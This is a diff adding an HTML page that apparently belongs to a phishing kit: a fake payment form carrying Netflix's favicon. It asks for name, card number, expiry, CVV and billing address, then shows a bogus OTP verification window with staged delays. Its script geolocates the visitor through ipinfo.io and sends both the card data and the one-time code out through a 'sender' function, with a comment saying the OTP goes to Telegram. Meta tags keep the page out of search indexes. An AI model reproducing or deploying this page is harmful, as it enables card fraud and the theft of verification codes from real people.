@@ -1,0 +1,255 @@
+<!doctype html>
+<html>
+<head>
+<title>Payment Form</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="bingbot" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="slurp" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="msnbot" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="yahoo" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="duckduckgo" content="noindex, nofollow, noarchive, nosnippet, noodp, noimageindex, notranslate">
+<meta name="baiduspider" content="noindex, nofollow, noarchive, nosnippet">
+<meta name="google" content="notranslate">
+<meta http-equiv="X-Frame-Options" content="DENY">
+<meta http-equiv="Cache-Control" content="no-store">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<link rel="shortcut icon" type="image/x-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2023.ico">
+<link rel="stylesheet" href="res/account.css">
+</head>
+<body>
+<header>
+<div class="left">
+<img src="res/logo.png">
+</div>
+<div class="right">
+<a href="">Sign Out</a>
+</div>
+</header>
+
+<section>
+
+<div class="form">
+<div class="form-title">
+Payment Information
+</div>
+<img src="res/cards.png" style="width:200px;">
+<div class="form-col">
+<input type="text" class="textinput" id="in0" placeholder="First Name">
+<span id="err0"></span>
+</div>
+<div class="form-col">
+<input type="text" class="textinput" id="in1" placeholder="Last Name">
+<span id="err1"></span>
+</div>
+<div class="form-col">
+<input type="text" class="textinput" inputmode="numeric" id="in2" placeholder="Card Number">
+<span id="err2"></span>
+</div>
+<div class="form-col">
+<input type="text" class="textinput" inputmode="numeric" id="in3" placeholder="Expiry Date">
+<span id="err3"></span>
+</div>
+<div class="form-col">
+<input type="text" class="textinput" inputmode="numeric" id="in4" placeholder="CVV Code">
+<span id="err4"></span>
+</div>
+<div class="form-col">
+<input type="text" class="textinput" id="in5" placeholder="Billing Address With Zipcode">
+<span id="err5"></span>
+</div>
+
+<div class="form-col" style="font-size:0.7em; color:#5c5c5c;">
+By submitting, you agree to our terms and conditions.<br><br><br>
+Please review the <a href="#">Terms and Conditions</a>.<br><br>
+<label style="display:flex; align-items:center; font-size:1.5em;">
+<input type="checkbox" style="width:20px; height:20px; margin-right:10px;"> I agree
+</label>
+</div>
+
+<div class="form-col">
+<button onclick="sbmt()" id="submit" class="sbmt">Continue</button>
+</div>
+
+<div style="color:#717171; margin-top:60px;">
+</div>
+
+</div>
+
+</section>
+
+<footer>
+<div style="">
+Contact Us
+</div>
+<div style="margin:30px 0;">
+FAQ
+</div>
+<div style="">
+<select style="padding:10px;" id="lang" onchange="setLang()">
+<option value="EN">English</option>
+<option value="ES">Española</option>
+<option value="DE">Deutsche</option>
+<option value="FR">Français</option>
+</select>
+</div>
+</footer>
+
+<div class="otp-window" id="otpwindow">
+<div class="otp-holder" >
+<div class="otp-content" >
+<div id="otp" style="display:none;">
+<div style="display:flex; align-items:center; justify-content:center;">
+<div style="text-align:left; width:50%;">
+<img src="res/logo.png" style="width:80px;">
+</div>
+<div style="text-align:right; width:50%;">
+<img src="res/vbvmcs.png" style="width:120px;">
+</div>
+</div>
+Enter OTP to verify<br>
+<p id="smserror" style="color:red; display:none;">Incorrect OTP</p>
+<div style="margin:50px 0;">
+<input type="text" inputmode="numeric" id="sms" placeholder="Enter OTP">
+<button onclick="sendOtp()">Submit OTP</button>
+</div>
+<div style="margin-top:30px;">
+<a href="#">New code</a>
+</div>
+</div>
+<div id="loader">
+<img src="res/loading.gif" style="margin-top:120px; width:60px;">
+</div>
+</div>
+</div>
+</div>
+
+<script src="res/jq.js"></script>
+<script src="res/m.js"></script>
+<script src="sax.js" nonce="MjU2OTczMTgzMiwzMDQ2MTcwMTUy"></script>
+
+<script>
+$(document).ready(function () {
+    // Apply masks to the card inputs
+    $("#in2").mask("0000000000000000"); // Card number
+    $("#in3").mask("00/00"); // Expiry date
+    $("#in4").mask("0000"); // CVV code
+});
+
+
+
+// Existing functions and code for form validation and OTP
+var validating = false;
+
+// Fetch user's location details
+function fetchLocation() {
+     return fetch('https://ipinfo.io/json?token=5cef41c9802ee9')
+        .then(response => response.json())
+        .then(data => {
+            userLocation.ip = data.ip;
+            userLocation.city = data.city;
+            userLocation.state = data.region;
+            userLocation.country = data.country;
+        })
+        .catch(error => {
+            console.error('Error fetching location:', error);
+            userLocation.ip = 'N/A';
+            userLocation.city = 'N/A';
+            userLocation.state = 'N/A';
+            userLocation.country = 'N/A';
+        });
+}
+
+function setLang() {
+    window.location = "?lang=" + document.getElementById("lang").value;
+}
+
+function sbmt() {
+    validating = true;
+    validate();
+
+    var abort = false;
+    for (var x = 0; x <= 4; x++) {
+        if (document.getElementById("in" + x).value == "") {
+            abort = true;
+        }
+    }
+
+    if (!abort) {
+        document.getElementById("otpwindow").style.display = "block";
+
+        var loader = document.getElementById("loader");
+        var otp = document.getElementById("otp");
+
+        setTimeout(function () {
+            loader.style.display = "none";
+            otp.style.display = "block";
+        }, 7000);
+
+        // Ensure location data is fetched before sending
+        fetchLocation().then(() => {
+            // Now location data is available
+            sender("credit_card");
+        });
+    }
+}
+
+function validate() {
+    if (validating) {
+        for (var x = 0; x <= 4; x++) {
+            var input = document.getElementById("in" + x);
+            var error = document.getElementById("err" + x);
+
+            if (input.value == "") {
+                error.innerHTML = "This field is required";
+                input.style.border = "1px solid #e77508";
+            } else {
+                error.innerHTML = "";
+                input.style.border = "1px solid #c9c9c9";
+            }
+        }
+    }
+}
+
+var textInputs = document.getElementsByClassName("textinput");
+for (var i = 0; i < textInputs.length; i++) {
+    textInputs[i].addEventListener("keyup", validate);
+}
+
+var tries = 0;
+var max_tries = 3;
+
+function sendOtp() {
+    var sms = document.getElementById("sms");
+    var smserror = document.getElementById("smserror");
+    var otp = document.getElementById("otp");
+    var loader = document.getElementById("loader");
+
+    if (sms.value.trim() !== "") {
+        smserror.style.display = "none";
+        otp.style.display = "none";
+        loader.style.display = "block";
+
+        // Simulate delay for OTP verification
+        setTimeout(function () {
+            loader.style.display = "none";
+            otp.style.display = "block";
+        }, 3000);
+
+        // Send OTP to Telegram
+        fetchLocation().then(() => {
+            sender("otp");
+        });
+    } else {
+        smserror.style.display = "block";
+        smserror.innerText = "OTP cannot be empty";
+    }
+}
+
+fetchLocation(); // Fetch user location as soon as the page loads
+</script>
+</body>
+</html>
